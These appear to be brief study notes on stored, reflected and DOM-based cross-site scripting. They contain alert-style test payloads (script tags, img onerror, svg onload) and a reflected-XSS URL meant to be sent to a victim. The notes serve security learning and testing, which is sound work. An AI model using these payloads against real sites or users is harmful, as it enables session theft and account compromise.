# Stored XSS 
## XSS Testing Payloads

```html
<script>alert(window.origin)</script>
```
## When XSS is stored, pressing ctrl + U will show us how the payload got embedded in source code.

```html
<div></div><ul class="list-unstyled" id="todo"><ul><script>alert(window.origin)</script>
</ul></ul>
```
# Reflected XSS
## Same payload but won't persist in the source code. So we send malicious link to user to attack. (Sent to server and we get a response)

```html
http://SERVER_IP:PORT/index.php?task=<script>alert(window.origin)</script>
```
## DOM XSS
## These payloads are executed on the client side and are not sent to the server.

## Payloads

```html
<img src=x onerror=alert(1)>
<svg onload=confirm(document.domain)>
```
